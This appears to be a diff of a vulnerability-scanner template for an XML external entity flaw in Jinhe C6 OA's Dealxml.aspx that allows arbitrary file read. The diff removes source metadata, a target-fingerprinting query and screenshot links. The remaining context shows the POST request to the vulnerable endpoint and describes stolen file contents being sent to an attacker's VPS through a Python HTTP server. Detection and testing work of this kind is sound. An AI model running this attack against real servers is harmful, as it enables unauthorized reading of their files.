@@ -3,12 +3,8 @@ info:
   name: 金和C6 Dealxml.aspx 存在XML实体注入致任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/egs9ez9i97g8hru7'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: egs9ez9i97g8hru7
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/JHSoft.Web.Appraise/Dealxml.aspx/ HTTP/1.1
@@ -68,13 +64,8 @@ http:
 
     python开启http服务，发送请求
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121855689-607e9767-1fa6-4247-8147-102b472fb459.png)
 
-
-    读取的文件内容会回显到VPS
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121855943-74936b7c-0873-4f08-991d-518f3318c16b.png)'
+    读取的文件内容会回显到VPS'
   redirects: false
   matchers:
   - status:
